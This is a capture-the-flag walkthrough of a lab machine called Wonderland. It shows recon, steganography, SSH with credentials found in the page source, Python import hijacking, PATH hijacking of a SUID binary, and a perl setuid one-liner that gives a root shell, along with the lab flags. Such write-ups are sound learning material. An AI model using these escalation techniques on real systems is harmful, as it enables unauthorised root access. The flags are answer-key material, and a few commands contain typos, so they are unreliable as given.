# Obtain the flag in user.txt

`nmap -sS -Pn -p- -T4 -vv 10.10.139.249`

We see that port 80 and 22 are open

`obuster dir --url 10.10.139.249 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40`

The website has a whiterabbit picture, some text.  No `/robots.txt`, `security.txt`, or anything in the source.
Looking at the image with steghide
```
└─$ steghide --info white_rabbit_1.jpg 
"white_rabbit_1.jpg":
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "hint.txt":
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

```
steghide --extract -sf white_rabbit_1.jpg    
Enter passphrase: 
wrote extracted data to "hint.txt".
cat hint.txt              
follow the r a b b i t
```

Gobuster is still running, however we have some results:

`/poem` is a poem about the Jabberwocky, (no source)

`/r` returns `Keep Going. "Would you tell me, please, which way I ought to go from here?"`
`/r/a` returns `Keep Going. "That depends a good deal on where you want to get to," said the Cat.`
`/r/a/b/b/i/t/` returns a PNG file, some text, but in the source is an interesting line `<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>`

Try this combination for SSH it lets us in.

I can't see the user.txt, root.txt is there but we have no read permissions, and a `py` script we have read, but no write to


checked `env`, `/ect/crontab/`
`sudo -l` indicates we can run python the .py file.

Attempts to run it elevated failed.  Getcap shows perl but we don't have execute permission.
No SUID files allowing for privesc.

`cat /root/user.txt`
Answer: `thm{"Curiouser and curiouser!"}`

# Escalate your privileges, what is the flag in root.txt?

create a file in `~` called random.py with the following:
```python
import os

os.system("/bin/bash")
```

`chmod +x random.py`

When the walrus.py is run it will import random.py instead of the system random and execute our code.

```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ 
```

We are now running as rabbit
Looking in the `/home/rabbit` we have a `teaParty` executable with SUID bit set.

Executing
```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Fri, 03 Nov 2023 07:15:32 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

Entering anything causes a `Segmentation fault (core dumped)` error

Downloading the file via scp
`scp teaParty user@attacker:/home/user/`
and open in Ghidra, in the Decompile window we see the code:
```C
void main(void)

{
  setuid(0x3eb);
  setgid(0x3eb);
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}
```

We can sere that there is no input and the `date` command is not referenced, which means it runs from the `$PATH` environment variable.

`export PATH=/tmp:$PATH` to add `/tmp` to path.
Create `/tmp/date` containing
```bash
#!/bin/bash
/bin/bash
```
`chmod +x /tmp/date`
Execute `./teaParty` and we get a shell
`whoami` reveals we are `hatter`

Look in `/home/hatter/password.txt`
`WhyIsARavenLikeAWritingDesk?`

Use SSH to logon to target as hatter for full shell.

Running `getcap -r / 2>/dev/null` we find that `/usr/bin/perl` has `cap_setuid+ep` is owned by root

`/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'`
gives us a shell as.
```bash
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

```bash
# cat /home/alice/root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

Answer: `thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}`